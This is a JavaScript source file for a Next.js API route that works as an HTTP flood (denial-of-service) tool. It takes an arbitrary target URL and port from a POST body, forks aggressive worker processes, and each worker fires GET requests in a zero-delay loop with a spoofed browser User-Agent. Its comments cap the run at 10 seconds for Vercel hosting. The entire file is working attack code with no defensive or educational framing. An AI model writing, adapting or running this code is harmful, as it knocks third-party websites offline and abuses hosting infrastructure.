// pages/api/http-vip.js
import http from 'http';
import https from 'https';
import cluster from 'cluster';
import os from 'os';

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).send('Method not allowed');
  }

  try {
    const { target, time = 10, port = 443 } = req.body;

    // Validate input
    if (!target) return res.status(400).send('Target required');
    const attackTime = Math.min(parseInt(time), 10); // Max 10s for Vercel
    const attackPort = parseInt(port);

    // Parse target URL
    const targetUrl = new URL(target.includes('://') ? target : `https://${target}`);
    const protocol = targetUrl.protocol === 'https:' ? https : http;
    const path = targetUrl.pathname || '/';

    // Start attack immediately
    res.status(202).send('Attack started');

    // Multi-threaded attack
    const numWorkers = os.cpus().length * 2; // Aggressive worker count
    let completedWorkers = 0;

    if (cluster.isPrimary) {
      for (let i = 0; i < numWorkers; i++) {
        cluster.fork();
      }

      setTimeout(() => {
        for (const id in cluster.workers) {
          cluster.workers[id].kill();
        }
        process.exit(0);
      }, attackTime * 1000);
    } else {
      // Worker process - actual attack
      const makeRequest = () => {
        const options = {
          hostname: targetUrl.hostname,
          port: attackPort,
          path: path,
          method: 'GET',
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Accept': '*/*',
            'Cache-Control': 'no-cache'
          }
        };

        const req = protocol.request(options);
        req.on('error', () => {});
        req.end();
      };

      // Maximum possible requests
      const interval = setInterval(makeRequest, 0);
      setTimeout(() => {
        clearInterval(interval);
        process.exit(0);
      }, attackTime * 1000);
    }
  } catch (error) {
    console.error(error);
    if (!res.headersSent) {
      res.status(500).send('Error');
    }
  }
}
